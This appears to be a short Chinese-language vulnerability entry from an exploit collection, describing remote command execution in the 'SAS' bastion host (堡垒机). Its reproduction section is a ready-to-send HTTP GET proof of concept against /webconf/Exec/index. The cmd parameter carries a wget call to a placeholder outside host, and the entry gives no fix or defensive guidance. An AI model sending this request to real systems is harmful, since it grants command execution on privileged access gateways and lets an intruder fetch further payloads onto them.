#### 影响范围

SAS堡垒机

#### 漏洞概述

SAS堡垒机 Exec远程命令执行

#### 漏洞复现

漏洞POC：

```
GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```



